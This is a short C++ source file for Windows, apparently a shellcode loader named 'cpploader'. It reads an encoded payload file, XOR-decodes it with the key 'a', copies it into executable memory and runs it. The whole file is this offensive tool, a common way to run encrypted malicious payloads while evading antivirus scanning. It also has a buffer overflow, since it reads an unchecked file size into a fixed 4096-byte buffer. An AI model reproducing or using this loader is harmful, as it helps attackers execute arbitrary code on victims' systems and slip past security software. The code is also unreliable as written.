#include <windows.h>
#include <iostream>
 
#pragma comment(linker, "/INCREMENTAL:NO")

void shellcode(LPCSTR inFilename)
{
	char buf[4096];
	HANDLE inFile = CreateFile(inFilename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	int size = GetFileSize(inFile, NULL);
	DWORD bytesRead = 0;
	ReadFile(inFile, buf, size, &bytesRead, NULL);
	for (int i = 0; i != sizeof(buf) / sizeof(buf[0]); i++) {
		buf[i] = buf[i] ^ 'a';
	}
	LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, buf, sizeof(buf));
	((void(*)())Memory)();
}

int main(int argc, char** argv) {
	if (argc != 2) {
		std::cout << "cpploader.exe enc.bin" << std::endl;
	}
	else {
		shellcode(argv[1]);
	}
	return 0;
}